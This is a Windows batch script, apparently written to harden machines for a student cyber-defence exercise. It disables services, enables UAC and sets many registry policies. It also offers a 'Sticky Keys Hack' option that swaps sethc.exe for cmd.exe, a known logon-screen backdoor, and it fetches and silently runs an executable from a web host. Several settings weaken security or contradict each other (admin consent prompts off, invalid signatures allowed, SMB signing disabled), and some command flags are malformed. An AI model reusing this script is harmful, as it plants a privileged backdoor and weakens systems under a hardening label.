@echo off

title Prepare to be blown away
color 0a

::: __________             .___                     
::: \______   \_____     __| _/____    ______ ______
:::  |    |  _/\__  \   / __ |\__  \  /  ___//  ___/
:::  |    |   \ / __ \_/ /_/ | / __ \_\___ \ \___ \ 
:::  |______  /(____  /\____ |(____  /____  >____  >
:::         \/      \/      \/     \/     \/     \/ 
:::   _________            .__        __            
:::  /   _____/ ___________|__|______/  |_          
:::  \_____  \_/ ___\_  __ \  \____ \   __\         
:::  /        \  \___|  | \/  |  |_> >  |           
::: /_______  /\___  >__|  |__|   __/|__|           
:::         \/     \/         |__|       

for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

SET /P ANSWER=Do you want to continue (Y/N)?
echo You chose: %ANSWER%
if /i {%ANSWER%}=={y} (goto :yes)
if /i {%ANSWER%}=={yes} (goto :yes)
if /i {%ANSWER%}=={n} (goto :no)
if /i {%ANSWER%}=={no} (goto :no)

:yes
REM RDP
echo Choose an option then press Enter
echo 1.Turn Remote Desktop On
echo 2.Turn Remote Desktop Off
echo.

set /p b=
IF %b%==1 regedit.exe /s RDPon.reg
IF %b%==2 regedit.exe /s RDPoff.reg



REM Flush DNS
echo Cleaning out the DNS cache...
ipconfig /flushdns
echo Writing over the hosts file...
attrib -r -s C:\WINDOWS\system32\drivers\etc\hosts
echo. > C:\Windows\System32\drivers\etc\hosts

REM Shares
net share > sharelist.txt
(
  for /F %%h in (sharelist.txt) do (
    net share /delete %%h >> deletedsharelist.txt 
  )
)


REM Turn UAC on
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d "3" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableInstallerDetection" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableVirtualization" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "dontdisplaylastusername" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticecaption" /t REG_SZ /d "" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "legalnoticetext" /t REG_SZ /d "" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "scforceoption" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "shutdownwithoutlogon" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "undockwithoutlogon" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d "0" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_TEXT" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_BITMAP" /t REG_DWORD /d "2" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_OEMTEXT" /t REG_DWORD /d "7" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_DIB" /t REG_DWORD /d "8" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_PALETTE" /t REG_DWORD /d "9" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_UNICODETEXT" /t REG_DWORD /d "13" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UIPI\Clipboard\ExceptionFormats" /v "CF_DIBV5" /t REG_DWORD /d "17" /f

REM Set UAC to default level
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "5" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "1" /f
Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "1" /f

REM Installing TakeOwnership
regedit.exe /s TakeOwnership.reg

REM Windows auomatic updates
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 4 /f

REM Services
Net stop "Telnet"
sc config "Telnet" start=disabled
Net stop "Telephony"
sc config "Telephony" start=disabled
Net stop "RIP Listener"
sc config "RIP Listener" start=disabled
Net stop "SNMP Trap"
sc config "SNMP Trap" start=disabled
Net stop "Remote Registry"
sc config "Remote Registry" start=disabled

REM Print startup list in C:\
wmic startup list brief /format:hform >c:\startup.html


REM now on to the power settings
REM use commands as vague as possible to set a require password on wakeup
REM assumes its a laptop, which is silly
powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1
powercfg -SETDCVALUEINDEX SCHEME_MIN SUB_NONE CONSOLELOCK 1
powercfg -SETDCVALUEINDEX SCHEME_MIN SUB_NONE CONSOLELOCK 1
powercfg -SETDCVALUEINDEX SCHEME_MAX SUB_NONE CONSOLELOCK 1
powercfg -SETDCVALUEINDEX SCHEME_MAX SUB_NONE CONSOLELOCK 1



REM Internet Explorer
REM Smart Screen for IE8
reg ADD "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV8 /t REG_DWORD /d 1 /f
REM Smart Screen for IE9+
reg ADD "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 1 /f

REM Windows Explorer Settings
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f
REM Disable Dump file creation
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 0 /f
REM Disable Autorun
reg ADD HKCU\SYSTEM\CurrentControlSet\Services\CDROM /v AutoRun /t REG_DWORD /d 1 /f

REM Disabled Internet Explorer Password Caching
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v DisablePasswordCaching /t REG_DWORD /d 1 /f 

REM Internet Explorer Settings

REM Enable Do Not Track
reg ADD "HKCU\Software\Microsoft\Internet Explorer\Main" /v DoNotTrack /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Internet Explorer\Download" /v RunInvalidSignatures /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_LOCALMACHINE_LOCKDOWN\Settings" /v LOCALMACHINE_CD_UNLOCK /t REG_DWORD /d 1 /t
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnonBadCertRecving /t REG_DWORD /d /1 /f
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnOnPostRedirect /t REG_DWORD /d 1 /f
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v WarnonZoneCrossing /t REG_DWORD /d 1 /f


REM Malwarebytes Installation
mbam-setup.exe /silent /norestart

REM Sticky Keys
echo Choose an option then press Enter
echo 1.Turn Sticky Keys Hack On
echo 2.Turn Sticky Keys Hack Off
echo.

set /p b=
IF %b%==2 (REM Give permissions needed
takeown /f c:\windows\system32\cmd.exe
takeown /f c:\windows\system32\sethc.exe
icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
REM Renaming and stuff
move sethc.exe sethc.old.exe
copy calc.exe sethc.exe
echo Stick Keys exploit stopped
pause)
IF %b%==1 (REM Give permissions needed
takeown /f c:\windows\system32\cmd.exe
takeown /f c:\windows\system32\sethc.exe
icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
REM Renaming and stuff
move sethc.exe sethc.old.exe
copy cmd.exe sethc.exe
echo Stick Keys exploit triggered
pause)



REM AVG Download, Installation, etc
cd C:\Windows\Temp\
echo ' Set your settings > C:\Windows\Temp\downloadAVG.vbs
echo    strFileURL = "http://www.statesmencybersecurity.org/avg.exe" >> C:\Windows\Temp\downloadAVG.vbs
echo    strHDLocation = "C:\Windows\Temp\avg.exe" >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo ' Fetch the file >> C:\Windows\Temp\downloadAVG.vbs
echo    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo    objXMLHTTP.open "GET", strFileURL, false >> C:\Windows\Temp\downloadAVG.vbs
echo    objXMLHTTP.send() >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo If objXMLHTTP.Status = 200 Then >> C:\Windows\Temp\downloadAVG.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.Open >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.Type = 1 'adTypeBinary >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.Position = 0    'Set the stream position to the start >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >> C:\Windows\Temp\downloadAVG.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> C:\Windows\Temp\downloadAVG.vbs
echo Set objFSO = Nothing >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.SaveToFile strHDLocation >> C:\Windows\Temp\downloadAVG.vbs
echo objADOStream.Close >> C:\Windows\Temp\downloadAVG.vbs
echo Set objADOStream = Nothing >> C:\Windows\Temp\downloadAVG.vbs
echo End if >> C:\Windows\Temp\downloadAVG.vbs
echo. >> C:\Windows\Temp\downloadAVG.vbs
echo Set objXMLHTTP = Nothing >> C:\Windows\Temp\downloadAVG.vbs
cscript.exe C:\Windows\Temp\downloadAVG.vbs
echo Download Done...
cd C:\Windows\Temp
avg.exe /UILevel=silent /InstallToolbar=0 /ChangeBrowserSearchProvider=0 /InstallSidebar=0 /ParticipateProductImprovement=0 /RemoveFeatures=LinkScnFea /DontRestart
echo Press enter when AVG works...
pause
cd %PROGRAMFILES%\AVG\AVG2015
avgmfapx.exe /AppMode=UPDATE
del C:\Windows\Temp\downloadAVG.vbs
pause

REM Disabling Windows Features
REM Assuming they are on, if they aren't then boo-who
dism /online /disable-feature /featurename:IIS-WebServerRole /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-WebServer /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-CommonHttpFeatures /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpErrors /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpRedirect /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ApplicationDevelopment /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-NetFxExtensibility /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-NetFxExtensibility45 /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HealthAndDiagnostics /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpLogging /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-LoggingLibraries /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-RequestMonitor /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpTracing /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-Security /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-URLAuthorization /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-RequestFiltering /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-IPSecurity /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-Performance /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpCompressionDynamic /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-WebServerManagementTools /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ManagementScriptingTools /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-IIS6ManagementCompatibility /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-Metabase /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HostableWebCore /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-StaticContent /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-DefaultDocument /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-DirectoryBrowsing /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-WebDAV /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-WebSockets /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ApplicationInit /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ASPNET /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ASPNET45 /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ASP /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-CGI /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ISAPIExtensions /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ISAPIFilter /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ServerSideIncludes /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-CustomLogging /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-BasicAuthentication /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-HttpCompressionStatic /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ManagementConsole /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-ManagementService /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-WMICompatibility /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-LegacyScripts /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-LegacySnapIn /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-FTPServer /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-FTPSvc /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:IIS-FTPExtensibility /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:TFTP /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:TelnetClient /Quiet /NoRestart /All 
dism /online /disable-feature /featurename:TelnetServer /Quiet /NoRestart /All

REM Common Policies
REM Restrict CD ROM drive
reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllocateCDRoms /t REG_SZ /d 1 /f
REM Automatic Admin logon
reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 0 /f
REM Logo message text
reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Lol noobz pl0x don't hax, thx bae"
REM Logon message title bar
reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "Dnt hax me"
REM Wipe page file from shutdown
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f
REM LOL this is a key? Disallow remote access to floppie disks
reg ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllocateFloppies /t REG_SZ /d 1 /f
REM Prevent print driver installs 
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Print\Providers\LanMan Print Services\Servers" /v AddPrinterDrivers /t REG_DWORD /d 1 /f
REM Limit local account use of blank passwords to console
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f
REM Auditing access of Global System Objects
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v auditbaseobjects /t REG_DWORD /d 1 /f
REM Auditing Backup and Restore
reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v fullprivilegeauditing /t REG_DWORD /d 1 /f
REM Do not display last user on logon
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v dontdisplaylastusername /t REG_DWORD /d 1 /f
REM UAC setting (Prompt on Secure Desktop)
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f
REM Enable Installer Detection
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableInstallerDetection /t REG_DWORD /d 1 /f
REM Undock without logon
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v undockwithoutlogon /t REG_DWORD /d 0 /f
REM Maximum Machine Password Age
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v MaximumPasswordAge /t REG_DWORD /d 15 /f
REM Disable machine account password changes
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v DisablePasswordChange /t REG_DWORD /d 1 /f
REM Require Strong Session Key
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v RequireStrongKey /t REG_DWORD /d 1 /f
REM Require Sign/Seal
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v RequireSignOrSeal /t REG_DWORD /d 1 /f
REM Sign Channel
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v SignSecureChannel /t REG_DWORD /d 1 /f
REM Seal Channel
reg ADD HKLM\SYSTEM\CurrentControlSet\services\Netlogon\Parameters /v SealSecureChannel /t REG_DWORD /d 1 /f
REM Don't disable CTRL+ALT+DEL even though it serves no purpose
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 0 /f 
REM Restrict Anonymous Enumeration #1
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v restrictanonymous /t REG_DWORD /d 1 /f 
REM Restrict Anonymous Enumeration #2
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v restrictanonymoussam /t REG_DWORD /d 1 /f 
REM Idle Time Limit - 45 mins
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v autodisconnect /t REG_DWORD /d 45 /f 
REM Require Security Signature - Disabled pursuant to checklist
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v enablesecuritysignature /t REG_DWORD /d 0 /f 
REM Enable Security Signature - Disabled pursuant to checklist
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v requiresecuritysignature /t REG_DWORD /d 0 /f 
REM Disable Domain Credential Storage
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v disabledomaincreds /t REG_DWORD /d 1 /f 
REM Don't Give Anons Everyone Permissions
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v everyoneincludesanonymous /t REG_DWORD /d 0 /f 
REM SMB Passwords unencrypted to third party? How bout nah
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters /v EnablePlainTextPassword /t REG_DWORD /d 0 /f
REM Null Session Pipes Cleared
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v NullSessionPipes /t REG_MULTI_SZ /d "" /f
REM Remotely accessible registry paths cleared
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg\AllowedExactPaths /v Machine /t REG_MULTI_SZ /d "" /f
REM Remotely accessible registry paths and sub-paths cleared
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg\AllowedPaths /v Machine /t REG_MULTI_SZ /d "" /f
REM Restict anonymous access to named pipes and shares
reg ADD HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters /v NullSessionShares /t REG_MULTI_SZ /d "" /f
REM Allow to use Machine ID for NTLM
reg ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v UseMachineId /t REG_DWORD /d 0 /f

echo Done
pause
exit

:no
echo I guess you're not ready
pause
exit
